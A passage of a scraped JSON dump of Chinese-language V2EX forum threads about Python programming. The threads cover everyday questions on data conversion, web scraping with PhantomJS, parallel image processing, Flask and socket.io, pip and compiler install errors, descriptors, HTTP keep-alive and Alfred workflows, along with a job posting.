i[0] not in years:\n        years.append(i[0])\n\n    if i[1] not in months:\n        months.append(i[1])\n\n    if i[2] not in p_levels:\n        p_levels.append(i[2])\nmonths.sort()\nyears.sort()\n\nresult={}\nresult['categories']=[str(year)+'-'+str(month) for year in years for month in months]\n\nfor p_level in p_levels:\n    for month in months:\n        result.setdefault(p_level,[]).append(dict1[2016][month].get(p_level, 0))\n\nprint result\n# {'p2': [0, 3, 0, 0], \n# 'p3': [0, 0, 25, 0], \n# 'p0': [1, 0, 0, 0], \n# 'p1': [0, 2, 0, 0], \n# 'p4': [0, 0, 0, 55], \n# 'categories': ['2016-1', '2016-2', '2016-3', '2016-4']}\n</code></pre>\n</div></div>"], "reply": "2", "tittle": "Python | 包含元组的列表转 JSON，更好的做法？", "comment": ["```Python\r", "rs = [(2016, 1, 'p0', 1), (2016, 2, 'p1', 2), (2016, 2, 'p2', 3),\r", "      (2016, 3, 'p3', 25), (2016, 4, 'p4', 55)]\r", "\r", "dic = {'categories': []}\r", "\r", "month = max([i[1] for i in rs])\r", "\r", "\r", "for i in rs:\r", "    dic.setdefault(i[2], [0 for j in range(month)])\r", "    dic[i[2]][i[1] - 1] = i[3]\r", "    dic['categories'].append(str(i[0]) + '-' + str(i[1]))\r", "\r", "print(dic)\r", "```\r", "\r", "这样？", " 谢谢回复，确实应该把预处理做的彻底一点，先全部初始化成 0 再填数据就好了…"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1 、我使用了 sqlalchemy 连接了我的 mysql 数据库</p>\n<p>2 、定义了<code>people</code></p>\n<pre><code>    class People(Base):\n        __tablename__ = 'people'\n        id = Column(BigInteger, primary_key=True)\n        name = Column(String(128))\n        birthplace = Column(String(128))\n</code></pre>\n<p>3 、定义</p>\n<pre><code>    class Person(graphene_sqlalchemy.SQLAlchemyObjectType):\n        class Meta:\n        model = PersonModel\n</code></pre>\n<p>4 、我想要可以搜索 people 里面的 name ，请问怎么写？？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "python 下 graphql 之 graphene 的 mutation 搜索求助！万分感谢", "comment": []},
{"content": ["<div class=\"topic_content\">要图文并茂的比如 pdf 格式。</div>"], "reply": "3", "tittle": "请问天涯楼主的长贴，有图片那种，爬虫到整合为一个文档？", "comment": ["请联系我 vx:stamaimer", "你这贴子让我想起来大概是 08 年 09 年左右，网上有多好天涯牛贴的汇总网站，类似于现在的“只看楼主”，只有楼主发布的内容，非常适合看连载的小说，当时还以为是手工整理的，现在知道了 python 后才明白，那些网站也应该是采集过来的。", " 是啊 那时候还是天涯火的时候 热门贴楼尾都是各种留言宣传它们的脱水贴网站地址 我也是现在也才知道是爬虫的 哈哈"]},
{"content": ["<div class=\"topic_content\">driver = webdriver.PhantomJS()\r<br>driver.get(url)\r<br>data = driver.find_elements_by_xpath('***********')\r<br>\r<br>试了试,貌似 js 生成的动态网页可以加载正常,但为什么 ajax 还是没有加载出来呢?应该怎么处理呢?\r<br>\r<br>另外 page_source 其实是未加 js 的原始 html 吧?就和 chrome 查看网页源代码一样吧?\r<br>那么想和 F12 看到的一样用什么方法呢?\r<br>\r<br>感谢.</div>"], "reply": "4", "tittle": "使用 webdriver.PhantomJS 无法加载 ajax 吗?", "comment": ["不了解 webdriver ，但 PhantomJS 是可以处理 AJAX 的。\r", "Chrome 的查看网页源代码功能和 F12 是一个效果啊", "等几秒试试？\r", "F12 Document 查看的是当前网页的 DOM ，被 js 改过的，不跑一遍没法一样。\r", "简单的请求可以从 F12 Network 里面抓。模拟发请求比 PhantomJS 效率高。", "不管你用什么 webdriver ， ajax 加载都需要等待的，最直接的方法就是指定固定的等待时间： time.sleep(10) ;\r", "或者智能一点，等待特定元素加载完成： WebDriverWait(driver, 20, 0.5).until(EC.presence_of_element_located(locator))；", " 可行"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家好，这两天遇到一个运算速度的问题，就是我的程序是关于图像处理的，有的函数是要通过把一张图片的每个像素点扫描，然后计算一些值，比如这样一个场景：有一张画布，上面有 3 个元素，我现在要计算每个空白位置的像素点与这三个元素之间的最短距离，这样如果画布面积太大，就会导致算法运行时间过长，实测的话 800x600 的画布，将这个函数循环迭代 600 次，就得耗时 10 个小时+，所以我想通过并行计算来试试，因为目前的服务器配置是 8 核 E5 2650V3 的，感觉自己的程序只用到了一个核。但是关于这方面的知识我不是很懂，所以请教一下各位，谢谢！</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>还是V站的前辈见识比较广，我要查一下这些技术，消化一下。。。。谢谢各位</p>\n</div></div>"], "reply": "27", "tittle": "关于 python 并行计算的问题", "comment": ["cuda mpi openmp", "这种问题用 GPU 算比 CPU 并行高效得多\r", "比如 opengl 还有 1L 提到的 cuda, 都有 python 接口", "奇怪！ 为何要循环做， 计算这个问题应该有数学方法直接解决的。。", "自己搜索 python gil", " 用的是阿里云服务器，貌似没看见有 GPU ，我想的是把一张图片切割然后分配到各个线程里去计算， cuda 的话感觉只是对矩阵运算的时候优势会大一点", "  我这个问题就是来自一篇论文的函数，按照文章的说法，就是逐个像素的计算，我想的优化方法就是类似卷积神经网络里的汇聚层一样，但是现在是想先利用下当前服务器 8 核这个优势", " 看起来不错，谢谢", "哦, 我以为就用自己 PC 算...\r", "上面打错了, 想写 opencl, 虽然 opengl 的计算着色器也能完成\r", "图片就是一个矩阵, 放到显卡上, 每个计算单元计算一个像素跟三个元素的距离, 最后得到最短距离跟对应像素, 不需要任何循环", "如果没有 gpu\r", "用 tbb 吧。。 \r", "这货参数配置得好，能让你的服务器爽死。。", " 看起来不错，我研究下，谢谢！\r", "\r", "\r", " 嗯，我试试我本地的电脑可不可以，听起来有点厉害啊，我研究下吧，谢谢啦", "我感觉你这个问题，写个多进程程序就能解决。", "想办法向量化啊， py 的循环多慢啊。。", "如果只是简单地改成多进程，也不过是将 10 小时缩短到一两个小时吧，效果并不太大。", "pool.map", " 你测试过了？", " \r", "  嗯，还是要在算法方面想办法，图像逐像素处理确实不是一个长久的方法", "将三个图片等分，然后并行跑如何呢， pillow 优于 pil 。", " 哈我用的就是 pillow ，这个方法我也想过，但是因为要求元素之间最短距离，分开的话就不知道怎么处理了，毕竟元素的位置分散在画布上", "multiprocessing", " 你用 pillow-simd 了？", " 没，就是普通的 pillow", "dask  \r", "\r", " 哇，简直不能更 cool ，谢谢！", " 如果底层还是 pillow ，用 cpu 算，还是建议试试 simd 版本", " 嗯，之前查过了，这个 simd 版本对 cpu 并行有过优化，可以可以，谢谢啦", "我实际操作了下你这个问题,  把问题简化成了: 计算图片上到若干像素距离最短的位置, 效率并不算太差啊\r", "到 3, 10, 30, 81 个像素最短距离的计算时间分别是: 160 ms, 460 ms, 1.34 s, 3.55 s, 时间线性递增,  还没用 opencl 试\r", "(注: 当点数过多的时候最短距离的位置不一定只有一个)\r", "\r", " 好优雅的代码！不过你现在把画布上的一个元素简化成了一个像素点（就是你代码里随机产生的位置），但是对于我现在做的东西来说，这个元素是不能简单的以一个像素点来看待，必须是一个 bounding box , 比如说一张广告，上面的标题元素，比如字号为 60 ，那么它占的像素面积就是一个 axb 大小的矩形框，如果求图片空白区域的每个像素点（无元素的地方）到它的距离，这就有点麻烦了，因为这个元素也是有很多像素点的， 我现在用的方法是 python 里的 scipy 的 distance_transform_edt 函数，链接： ", "\r", "\r", "\r", "这是目前我找到的最好的解决方法，但是计算时间还是不理想，这两天在看 multiprocess 的东西，应该会有用。\r", "\r", "非常感谢您能腾出时间来考虑我的问题，谢谢！"]},
{"content": ["<div class=\"topic_content\">个人作品，用 Flask 和 markdown 搭建的,欢迎尝试使用提供参考意见。\r<br><a target=\"_blank\" href=\"https://github.com/hacklogic/PyMarkBlog\" rel=\"nofollow\">https://github.com/hacklogic/PyMarkBlog</a></div>"], "reply": "26", "tittle": "开源个人博客系统 PyMark", "comment": ["蛮有意思，支持一下", "来支持一下", "一年前的?...", "Latest commit 2114a4a  on 22 Jul 2015", "话说为何现在才来发布一年前做好的东西", "已 start ~", "噗，是 star ~", "pyc 还上传了，发上来之前自己看过吗？", "个人感觉质量不太行，不喜勿喷", "楼主的很不错，借楼主个楼，也可以看看我这个哈，周末完成的~~~开源 造福人类~~\r", "\r", " \r", " \r", "之前就发布过了", "有会前端的 可以帮忙改改", "已 star, 顺便安利一下我的 python 静态博客生成器😂  : ", "\r", "  博客做的不错\r", " 我不是异教徒😂", " 你的博客萌了我一脸血 TAT ，，，想请教下，那个生成器是生成 github 那个静态 blog 页面的吗？", " .DS_store 还没删除呢，自己看过吗，还好意思 @别人？", " 一堆 pyc 在项目里", "我的页面放在 SQLite 数据库里", "  呃, 生成静态页面, 可以部署到 github page 上.", " 我可以很负责任的说，我是参考了很多别人的项目，选择了一个自己觉得合适的方案，代码是我自己一点一点写的。我不是做 python 的，我只想分享想我做的东西而已。我觉得你很小气啊。我就在你楼下借用下楼层，你至于这样攻击人吗？", " 哈哈，原来一直用 hexo 。用 alfred2 直接命令传到 github 上。觉得挺好用的", "   我有攻击你吗，我说的不是事实嘛？您说要造福人类主动 @我，不然我会理你吗？", " 事实的确是我自己码的代码。别人的代码我也分析之后才加进来的。", " 说了半天，您连您作品的槽点都没 GET 到，我真醉了，别回了谢谢。", "借楼~php 开源 markdown 博客系统 [Startblog]( ", ")", "  (tornado, sqllite, redis)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>写了个简单服务 socketio 服务，可以与 web 端通信，但是和 app 端就是没有办法通信， 是服务器的问题还是终端问题？请各位大神帮帮忙</p>\n<p>#!/usr/bin/env python</p>\n<h1>-<em>- coding: utf-8 -</em>-</h1>\n<p>from flask import Flask, render_template\nfrom flask_socketio import SocketIO, send\nfrom flask_sqlalchemy import SQLAlchemy\napp = Flask(<strong>name</strong>)\napp.config['SECRET_KEY'] = 'mysecret'\nsocketio = SocketIO(app)\n@socketio.on('message')\ndef handleMessage(msg):\nprint 'Message:' + msg\t\nsend(msg, broadcast=True)\nif <strong>name</strong> == '<strong>main</strong>':\nsocketio.run(app, host= '0.0.0.0', port=5008, debug=True)</p>\n</div></div>"], "reply": "5", "tittle": "flask-socketio 怎么和 app 端通信啊", "comment": ["和 app 请使用 socket.io 的客户端进行通讯", ", 我想用 python 做服务器端， 然后 app 作为客户端？ 您说的是 python 这边也用客户端？", " 是的， socket.io 并不是标准 socket 协议，所以必须要用专门的客户端通讯", " 那服务器端呢， 不使用还是使用其他什么？", " 你的服务端是 flask-socketio ，客户端也要用符合 socket.io 标准协议的客户端，这样好理解了吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我有一个业务需要根据上一次数据库的数据进行更新标志位（数据库用的是 mongodb ），当我新数据更新的时候我需要和老数据进行对比决定是否更新，目前已经做了缓存但是还是没有达到我的目标</p>\n<hr>\n<ul>\n<li>伪代码：</li>\n</ul>\n<pre><code>\nnew_item = queue.get()  #得到一条数据\n\n#查询是否在缓存内\nif new_item in cache_list:  \n   return new_item\n\nelse:\n    query_result = fetch_flag_change(new_item)  #得到标志位是否相同\n    if  query_result == signal_1:\n         cache_list.update({query_result: signal_1})\n    elif query_result == signal_2:\n         cache_list.update({query_result: signal_2})\n   else:\n         return cache_list\n</code>\n</pre>\n<p>我认为可能是因为我的数据是一条一条查询的数据库所以很慢，有什么更好的办法能批量查询吗？</p>\n</div></div>"], "reply": "4", "tittle": "求一个数据库更新思路", "comment": ["没太看懂这个代码。这个 cache_list 作为缓存发挥的作用是什么？", " 缓存上一次查询到的结果", " 我将上一次数据库里面查询到的结果保存起来，如果相同就不需要再查数据库了", "那你的目表是什么呢。\r", "如果嫌查询慢， 那\r", "1 、启动时一次性将尽量多的数据加载到 cache\r", "2 、更新时顺带更新 cache\r", "3 、优化数据库查询"]},
{"content": ["<div class=\"topic_content\">广州中国科学院计算机网络信息中心\r<br>工作地点：广州市南沙资讯科技园 （地点较为远，但环境和工作氛围都很好，打起码来也心情舒畅~~）\r<br>\r<br>\r<br>python 工程师（后台方向）\r<br>岗位职责：\r<br>1 、负责无线城市项目代码开发及代码审核、质量控制；\r<br>2 、对所开发的功能进行测试并建立和完善开发文档；\r<br>3 、持续重构与维护组件保持可用性和稳定性。\r<br>任职要求：\r<br>1 、熟悉面向对象的设计思想，熟悉 RESTful web service 规范；\r<br>2 、熟悉 Python 语言，熟练使用 Python 标准库和流行的第三方库；\r<br>3 、熟悉 Tornado 等常用开发框架，有研究过其源码优先；\r<br>4 、熟悉 TCP/IP 协议及 HTTP 协议, 了解基本的前端技术， HTML 、 CSS 、 JS 、 Ajax 等；\r<br>5 、熟练使用 mysql ，熟悉 mysql 的各种存储引擎，熟悉索引工作原理，有丰富的 mysql 性能优化经验优先；\r<br>6 、熟悉以下主流服务器端开源系统或者其中一部分： Redis/MongoDB/RabbitMQ/Memcache/Nginx ；\r<br>7 、对代码和设计质量有严格要求，重视 Code Review ，知道良好的编程习惯的标准；\r<br>8 、具备强烈的责任心，对工作有激情，良好的沟通能力，良好的团队合作精神，能够承受一定的工作压力。\r<br>\r<br>\r<br>\r<br>大神们想看新机会的，欢迎投递简历至邮箱 <a target=\"_blank\" href=\"mailto:zhaopin@cnicg.cn\">zhaopin@cnicg.cn</a> ，或添加工作 Q 号（ 2130679879 ）进行了解~~</div>"], "reply": "3", "tittle": "求一枚 python 大神", "comment": ["用 flask 的路过。。", " 我们公司用 flask ，哈哈。有兴趣吗？发个邮件，留个联系方式吧？ ", " 做的东西比较杂，爬虫，大数据，搜索引擎(elasticsearch), 然后才是 flask ，感觉除了 es 比较精之外，其他的都稀松得很。怕入不了达人的法眼啊。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>阿西吧，在忙毕业设计，本来一开始说的是自己从头到尾，写一个博客系统当做毕业设计，可是，经过与指导老师商量，老师说，这种开源的东西太多了，你自己写一个会耗费大量精力，前端后台，一个人整不好。于是，老师要求我用开源的 wordpress 实现博客系统，然后学习 Python ，写个自动爬取互联网金融资讯的爬虫整合到 wordpress 上，发表博文，让我把经历放在爬虫上。\n请问各位大神，有没有什么经验啊，我没学过 Python ，目前正在学， wordpress 一直再用。大家有什么框架，或者开源的东西参考一下吗？求点意见。</p>\n</div></div>"], "reply": "5", "tittle": "如何整合 Python 爬虫与 wordpress", "comment": [" 感谢。请问爬虫好学吗，新手需要多长时间才能自己弄好呢", "WordPress REST API\r", "\r", " 具体看网站有没有反爬措施。\r", "一般你学习 requests+beautifulsoup 就能应对大部分网站了", " 好的，谢谢"]},
{"content": ["<div class=\"topic_content\">查了下 storm 官方的文档没看明白。\r<br>后来搜了下 yelp 开源了个 Pyleus 。\r<br>貌似还有各 pystorm\r<br>\r<br>现在有没有什么成熟点的方案，实在不想再去写 java 代码了</div>"], "reply": "目前尚无回", "tittle": "Python storm 开发有什么最佳实践吗？", "comment": []},
{"content": "", "reply": "3", "tittle": "通过新浪微博 API 获取微博数据，有个时间(微博发布时间)的格式是： WedNov3009: 36: 17+08002016，怎么解析？", "comment": ["Wed,Nov,30,09: 36: 17+0800,2016", "ls 正解", " \r", "\r", "谢谢，看明白了，这个串在程序里自动变成：“ Wed Nov 30 09: 36: 17 0800 2016 ”，用空格分割一下就出来了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>pip install --index-url <a href=\"http://pypi.doubanio.com/simple/\" rel=\"nofollow\">http://pypi.doubanio.com/simple/</a> requests</p>\n<p>Non-zero exit code (1)</p>\n<p>Try to run this command from the system terminal. Make sure that you use the correct version of 'pip' installed for your Python interpreter located at 'C:\\Python\\Python36\\python.exe'.</p>\n<p>Collecting requests</p>\n<p>The repository located at <a href=\"http://pypi.doubanio.com\" rel=\"nofollow\">pypi.doubanio.com</a> is not a trusted or secure host and is being ignored. If this repository is available via HTTPS it is recommended to use HTTPS instead, otherwise you may silence this warning and allow it anyways with '--trusted-host <a href=\"http://pypi.doubanio.com\" rel=\"nofollow\">pypi.doubanio.com</a>'.\nCould not find a version that satisfies the requirement requests (from versions: )\nNo matching distribution found for requests</p>\n</div></div>"], "reply": "26", "tittle": "为什么我用 pycharm 安装第三方库老是失败啊，也百度了很多，没找到啊", "comment": ["把 http 改成 https 也没用啊", "pip install requests --trusted-host ", " 试试", "换清华的源试试\r", "pip install -i ", " some-package", "Try to run this command from the system terminal. Make sure that you use the correct version of 'pip' installed for your Python interpreter located at 'C:\\Python\\Python36\\python.exe'.\r", "\r", "好好把这段给鸡翻一下，你看是不是 pip 跟 python 版本不对应", " \r", " \r", "Command \"python setup.py egg_info\" failed with error code 1 in C:\\Users\\cgy\\AppData\\Local\\Temp\\pip-build-wwuh4pnj\\cffi\\\r", "这是怎么回事呢？", " 我 pip 的版本是最新的 9.01 ，应该不会吧", "windows 下安装库？\r", "\r", " 你安装了 Microsoft Visual C++ Compiler for Python 2.7  或者 Microsoft Visual C++ Compiler for Python 3.4 了吗", "你需要 ", "你是不是还装了 Python2.x 版，可能是用了 2.x 对应的 pip", " 为什么我百度不到安装包呢？能不能给个链接", " 我已经卸载了，难道是没卸载干净？", " 你可以 pip -V 看看是不是 3.x 的版本", " ", "  2.7 的\r", "\r", "3.x 版本的话，我是直接装了 VS 2015. 你试试 Visual C++ Build Tools \r", "  ", " 有没有用吧", "最近 pypi 源抽风", "跟 VC 和 PIP 版本都没关系就是个参数问题， pip install --index-url ", " requests --trusted-host ", " ， 需要用这个参数“-trusted-host ", " ”，否则为不信任源", "命令后加上--trusted-host ", " 这个参数  pip install --index-url ", " requests  --trusted-host ", " \r", "pip 9.0.1 from C:\\Users\\cgy\\AppData\\Roaming\\Python\\Python36\\site-packages (python 3.6)\r", "没有问题呀", "Command \"c:\\python\\python36\\python.exe -u -c \"import setuptools, tokenize;__file__='C:\\\\Users\\\\cgy\\\\AppData\\\\Local\\\\Temp\\\\pip-build-clugysos\\\\numpy\\\\setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.rea\r", "d().replace('\\r\\n', '\\n');f.close();exec(compile(code, __file__, 'exec'))\" install --record C:\\Users\\cgy\\AppData\\Local\\Temp\\pip-_hf3fge5-record\\install-record.txt --single-version-externally-managed --compile\" fai\r", "led with error code 1 in C:\\Users\\cgy\\AppData\\Local\\Temp\\pip-build-clugysos\\numpy\\\r", "\r", "这是什么问题啊", "给了管理员权限了吗", " 给了，但是没用啊。而且一般是不用给管理员权限的吧", "现在换成清华的镜像是可以的，可是报了个新的错  \r", "error: command 'C:\\\\Program Files (x86)\\\\Microsoft Visual Studio 14.0\\\\VC\\\\BIN\\\\x86_amd64\\\\cl.exe' failed with exit status 2\r", "好像是编译器的问题，但是还是无法解决", " set STATICBUILD=true && pip install XXX", "Windows 上，编译会经常有问题。可以尝试使用 anaconda 或者，国外有个.edu 的网站，有已经编译好的", "一般这个时候我会检查我的 pip 版本是不是最新版。我一般出现是在初始化 virtualenv 的时候，那时候 pip 的版本不是最新的，可试试。", "python 在 windows 安装库很蛋疼\r", "8 楼比较靠谱，不过也不一定成功", " \r", " \r", "是最新的啊，我现在报 vs2014 目录下的 cl.exe 找不到 msdia140.dll ，可是明明有啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>import types</p>\n<p>from functools import wraps</p>\n<p>class profiled:</p>\n<pre><code>def __init__(self,func):\n    wraps(func)(self)    \n \ndef __call__(self,*a,**k):\n    print(\"profiled.call\")        \n    return self.__wrapped__(*a,**k)\n\ndef __get__(self,instance,cls):\n    if instance is None: return self\n    foo=types.MethodType(self,instance)\n    print(\"profiled.get:\",foo)\n    return foo\n</code></pre>\n<p>class spam:</p>\n<pre><code>@profiled\ndef bar(self,x):print(x)\n</code></pre>\n<p>if <strong>name</strong> == '<strong>main</strong>':</p>\n<pre><code>s=spam()\nprint(s.__dict__,spam.__dict__,'\\n')\nf=s.bar\nprint(f,type(f),f.__dict__,sep='\\n')\nf(\"TEST\")  #f 已经是绑定的方法了，为什么还要调用__call__()\n</code></pre>\n</div></div>"], "reply": "4", "tittle": "描述器类中__get__()的疑问", "comment": ["输出：\r", "{} {'__dict__': <attribute '__dict__' of 'spam' objects>, '__doc__': None, '__weakref__': <attribute '__weakref__' of 'spam' objects>, '__module__': '__main__', 'bar': <__main__.profiled object at 0x02A8BCF0>}\r", "\r", "profiled.get: <bound method spam.bar of <__main__.spam object at 0x70>>\r", "<bound method spam.bar of <__main__.spam object at 0x70>>\r", "<class 'method'>\r", "{'__annotations__': {}, '__wrapped__': <function spam.bar at 0x10>, '__qualname__': 'spam.bar', '__name__': 'bar', '__module__': '__main__', 'n': 0, '__doc__': None}\r", "profiled.call\r", "TEST", "因为 f 不是 bar ，而是 wrappered 过的 bar,本质上应该是 profiled 类吧", "看了下 MethodType 的源码，不是很明白这里面的原理：\r", "\r", "class _C:\r", "    def _m(self): pass\r", "MethodType = type(_C()._m)", " \r", "type(_c()._m)  #这是创建类还是查看类型？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这个是用来模拟测试环境的，但是 302 那个 response 的 FIN 被置 1 ，连接断开了\n如何在以下过程中保持 TCP 长连接？\nGET-&gt;302-&gt;GET</p>\n<pre><code>from http.server import SimpleHTTPRequestHandler\nfrom http.server import HTTPServer\n\n#Listen Address\nADDR = ''\n#Listen Port\nPORT = 80\n\nclass WebRequestHandler(SimpleHTTPRequestHandler):\n    def do_GET(self):\n        #self.close_connection=False\n        self.protocol_version='HTTP/1.1'\n        rawpath =  self.path.split('?')[0]\n        if(rawpath == '/ITPage/SurftheInternet.aspx' ):\n            self.send_response(302)\n            self.send_header('Content-Type','text/html; charset=utf-8')\n            self.send_header('Location','/ITPage/SurftheInternet.html?openid=testestestestest')\n            self.end_headers()\n        if(rawpath == '/ITPage/SurftheInternet.html'):\n            self.send_response(200)\n            self.end_headers()\nserver = HTTPServer((ADDR,PORT),WebRequestHandler)\nprint(\"Server start!\")\nserver.serve_forever()\n</code></pre>\n</div></div>", "<div class=\"topic_content\">问题已解决\r<br>不需要 Connection:Keep-Alive ， HTTP/1.1 默认就是长连接\r<br>我遇到的问题是因为没有包含 Content-Length \r<br>浏览器一直在等待数据，所以就卡死了\r<br>添加 self.send_header('Content-Length','0') ，问题解决</div>"], "reply": "9", "tittle": "Python SimpleHTTPRequestHandler，如何保持 TCP 长连接", "comment": ["1. protocol version 直接放 class 里\r", "2. 设置 header Connection: keep-alive", " 我试了下，抓包确实看到了 302 没有 FIN ，但是浏览器似乎不认这个 302 ，浏览器 F12 没有记录到，也没有跳转\r", "如果只按 1 操作，抓包没有 302 ， python 没有回应 GET", "我好像知道了， Content-Length 吧？", "你自己写 handler 啊\r", "那你输出的 header 里并没提到 Connection: Keep-Alive 啊", " 不是 content-length\r", "你查查 Connection: keep-alive", " \r", "不需要 Connection: Keep-Alive ，浏览器在发起 GET 请求的时候就已经包含了 Connection: Keep-Alive\r", "而且 HTTP/1.1 默认就是长连接\r", "我遇到的问题是因为没有包含 Content-Length\r", "浏览器一直在等待数据，所以就卡死在哪了\r", "添加 self.send_header('Content-Length','0')\r", "这样就可以了", "说什么都比不上源码： ", "\r", "你自己问的是连接断开了怎么办，怎么保持长连接\r", "请求 header 和响应 header 是两回事\r", "另外，你的问题文档里有明确说过： ", " 嗯是我描述不清楚，我也是发完帖子注意到文档里说要加 content-length\r", "还是谢谢你了：）", "我擦，没注意，暴露马甲了...."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这两天晚上学习了一下 mac 上的 workflow 开发，写出了两个小玩意。想着之前在网上，没有看到比较详细的中文开发教程(虽然，开发过程其实很简单)，就自己写了个入门级的教程。希望对这方面入门级别的开发有所帮助。\n开发语言可以是 Python/Php...</p>\n<p>详细的开发教程在地址： <a href=\"http://allenwu.itscoder.com/how-to-write-a-workflow-for-mac\" rel=\"nofollow\">http://allenwu.itscoder.com/how-to-write-a-workflow-for-mac</a></p>\n<p>两个 Demo 级别的 workflow 地址： <a href=\"https://github.com/wuchangfeng/Vino-Workflow\" rel=\"nofollow\">https://github.com/wuchangfeng/Vino-Workflow</a></p>\n<p>自己写的两个玩意，一个是 Gank 的搜索，一个是 有道的翻译：</p>\n<p><img alt=\"\" src=\"http://ww1.sinaimg.cn/large/b10d1ea5jw1fa3ehbrb3bj20w80r6gua.jpg\"></p>\n<p>==================================================================\n<img alt=\"\" src=\"http://ww1.sinaimg.cn/large/b10d1ea5jw1fa3ehw10kaj20w60gy0wu.jpg\"></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>更新啦！！！</strong></p>\n<p>中午想起来 v2ex 也有设计很赞的 API，趁着还有兴趣立马就给 v2ex 写了个 workflow，功能是获取 v2ex 当日十条热门帖子。</p>\n<ul>\n<li>\n<p>用法就是下载之后点击安装：<a href=\"https://github.com/wuchangfeng/Vino-Workflow/blob/master/v2ex/V2ex.alfredworkflow\" rel=\"nofollow\">https://github.com/wuchangfeng/Vino-Workflow/blob/master/v2ex/V2ex.alfredworkflow</a></p>\n</li>\n<li>\n<p>输入触发词 v2 即可</p>\n</li>\n<li>\n<p>地址在这里，感兴趣的可以收藏下，写好的都放这里：<a href=\"https://github.com/wuchangfeng/Vino-Workflow\" rel=\"nofollow\">https://github.com/wuchangfeng/Vino-Workflow</a></p>\n</li>\n</ul>\n<p><img alt=\"\" src=\"http://ww4.sinaimg.cn/large/b10d1ea5jw1fa4b35ky7pj20vy0r6tm7.jpg\"></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>新想法</strong></p>\n<p>有个想法，我们写 markdown 时候最繁琐的就是上传图片到七牛、又拍云、Lencloud 之类的云存储上，获得 url。</p>\n<p>其实它们原理都是一样，你上传 file ，然后给你返回数据。然后我就想到了用 workflow 实现这个功能，直接在 workflow 本地搜索图片，然后后台上传，之后直接右键粘贴即可。一气呵成。</p>\n<p>但是，作为 user，就必须要去申请各种各样的平台的 key 啊，secret 啊之类，好麻烦...</p>\n<p>然后突然想到自己经常用的新浪微博图床，嘿嘿，每个人都可以有个微博吧，而且这些资源跟你微博账号绑定的，应该来说还是相对安全的。</p>\n<p>我就上网 google 了一下，发现微博图床的 API 还真的有：<a href=\"http://picupload.service.weibo.com/interface/\" rel=\"nofollow\">http://picupload.service.weibo.com/interface/</a></p>\n<p>并且新浪微博 google 图床插件也是开源的。</p>\n<p>感觉应该不难实现，可以我自己也没啥时间，，，</p>\n<p>有了想法之后，就这样啦，期待有人拿这个练手，嘿嘿。</p>\n</div></div>"], "reply": "30", "tittle": "写了个 Alfred Workflow 开发的中文入门教程，希望有点小用处", "comment": ["写的很不错。赞", "干货前编辑来赞一个 (逃", "Alfred Workflow 都还不怎么会用呢...", " 哈哈，谢谢，因为自己看的是全英文的教程，虽然简单，但是对于大部分人来讲还是有点抵触，所以就写了个“图文并茂”中文小白教程...", " 嘿嘿，我认得大兄弟你。跟着你的博客学到了不少东西，谢谢啦。", " 赶紧尝试下呗，炒鸡好用的，都说是 Mac 上的神器", "我都是直接 shell 写的,一个有道一个查 ip,shell 写挺方便的", "这个棒", "python 和 shell 写这个还是比较好玩的", " 嘿嘿，其实都差不多，主要自己会点 Python ，改天学习下 shell 。", " 是的，希望有点小用处。", "小弟去干活、学习了，有什么建议，可以直接留言。博客为了简洁，没有添加多说，不好意思啦。对了小弟找一份实习，有兴趣的看一下博客的 About 中的 Resume （逃", "写的很不错。赞", "博客很简洁啊。用 hexo 搭建的吗？请问", " 用的 jkelly ，人家的模板然后自己改了改，不过这种样式的博客容易写出来，之前用 Django 写过一个。", "很赞", "更新啦，添加了 V2EX 当日 10 大热门帖子的 workflow ，哈哈，因地制宜。", "好赞啊！", "Alfred 能不能自动操作 mac 版微信？\r", "\r", "在想如果晚睡加班到 9 点就自动打开微信给我老婆发一条微信说今晚加班，晚点回。", "如果能添加单词到生词本就完美了", " 这个不难，我看到有人实现过，等周末看看可有时间，来研究下", " 这个应该不能吧。。。", " 嘿嘿，很简单的，肯花时间研究下都能做出来", "不错，如果能加入一些高级功能就好了。比如{query}的分解啥的，还有如何 debug 。", " 好的，周末看看可有时间更新下。我用 Python 写的脚本，调试是直接在终端命令行 python xxx.py ，看报什么错。如果开了 log 日志，在 workflow 入口也能报简单的提示。", " workflow 里面有一个 utilities ，里面有个 debug 的选项。", " 好的，谢谢你 我也只是入门级别的。", "wox ： windows 版的 alfred ，来源免费～", " 谢谢", "这个不错，学习下，后面也试试"]},
{"content": ["<div class=\"topic_content\">安装第三方库的时候报了\r<br>error: command 'C:\\\\Program Files (x86)\\\\Microsoft Visual Studio 14.0\\\\VC\\\\BIN\\\\x86_amd64\\\\cl.exe' failed with exit status 2\r<br>然后我去点击 cl.exe 时说找不到 msdia140.dll ，后来去谷歌了一下，就找到了一种方法\r<br><a target=\"_blank\" href=\"http://blog.csdn.net/sptoor/article/details/8892315\" rel=\"nofollow\">http://blog.csdn.net/sptoor/article/details/8892315</a>\r<br>可是尝试了一下都不行啊</div>"], "reply": "6", "tittle": "vs2014 目录下的 cl.exe 找不到 msdia140.dll", "comment": ["Microsoft Visual Studio 14.0 是指 Visual Studio 2015 。\r", "你去 'C:\\\\Program Files (x86)\\\\Microsoft Visual Studio 14.0\\\\VC\\\\BIN\\\\x86_amd64' 里执行 cl 肯定是会保报错的。\r", "\r", "安装  Visual Studio 2015 的时候应该有 python tools 的选项吧，你重新装一下试试。", "，，，以为你在编译草榴.exe 。。。。", "看到 cl 我第一时间就想到了草榴，告诉我 我不是一个人！！", " 草榴是什么鬼", " 我考，又开车", " 没用啊"]},
